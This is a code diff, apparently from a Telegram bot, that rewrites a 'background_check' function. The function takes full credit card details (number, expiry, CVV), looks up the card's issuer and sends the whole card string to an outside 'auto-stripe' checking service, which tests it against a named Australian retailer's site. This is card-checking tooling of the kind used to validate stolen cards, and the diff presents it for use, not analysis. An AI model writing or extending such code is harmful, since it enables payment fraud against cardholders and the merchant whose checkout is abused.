@@ -1427,28 +1427,50 @@ async def get_bin_details(bin_number: str) -> dict:
         return bin_data
 
 # ✅ Background check now uses live BIN data
-async def background_check(cc_normalized, parts, user, user_data, processing_msg):
-        bullet_text = escape_markdown_v2("[⌇]")
-        bullet_link = f"[{bullet_text}]({BULLET_GROUP_LINK})"
-        
-        try:
-                bin_number = parts[0][:6]
-                bin_details = await get_bin_details(bin_number)
+async def background_check(cc_raw, user, user_data, processing_msg):
+    from telegram.constants import ParseMode
 
-                brand = (bin_details.get("scheme") or "N/A").upper()
-                issuer = (bin_details.get("bank") or "N/A").title()
-                country_name = (bin_details.get("country_name") or "N/A")
-                country_flag = bin_details.get("country_emoji", "")
+    bullet_text = escape_markdown_v2("[⌇]")
+    bullet_link = f"[{bullet_text}]({BULLET_GROUP_LINK})"
 
-                # Your main API call
-                api_url = f"https://darkboy-auto-stripe-y6qk.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
-                
-                async with aiohttp.ClientSession() as session:
-                        async with session.get(api_url, timeout=45) as resp:
-                                if resp.status != 200:
-                                        raise Exception(f"HTTP {resp.status}")
-                                data = await resp.json()
-                api_status = (data.get("status") or "Unknown").strip()
+    try:
+        # --- Normalize card input ---
+        cc_normalized = cc_raw.replace("/", "|").replace("\\", "|")
+        parts = cc_normalized.split("|")
+
+        if len(parts) < 4:
+            await processing_msg.edit_text(
+                "❌ Invalid format. Use like:\n"
+                "`1234567812345678|12|2028|123`\n"
+                "or `/` or `\\` instead of `|`.",
+                parse_mode=ParseMode.MARKDOWN_V2
+            )
+            return
+
+        # --- BIN lookup ---
+        bin_number = parts[0][:6]
+        bin_details = await get_bin_details(bin_number)
+
+        brand = (bin_details.get("scheme") or "N/A").upper()
+        issuer = (bin_details.get("bank") or "N/A").title()
+        country_name = (bin_details.get("country_name") or "N/A")
+        country_flag = bin_details.get("country_emoji", "")
+
+        # --- Main API call ---
+        api_url = (
+            f"https://darkboy-auto-stripe-y6qk.onrender.com/"
+            f"gateway=autostripe/key=darkboy/"
+            f"site=buildersdiscountwarehouse.com.au/"
+            f"cc={cc_normalized}"
+        )
+
+        async with aiohttp.ClientSession() as session:
+            async with session.get(api_url, timeout=45) as resp:
+                if resp.status != 200:
+                    raise Exception(f"HTTP {resp.status}")
+                data = await resp.json()
+
+        api_status = (data.get("status") or "Unknown").strip()
 
         # Status formatting with safe try/except
                 try:
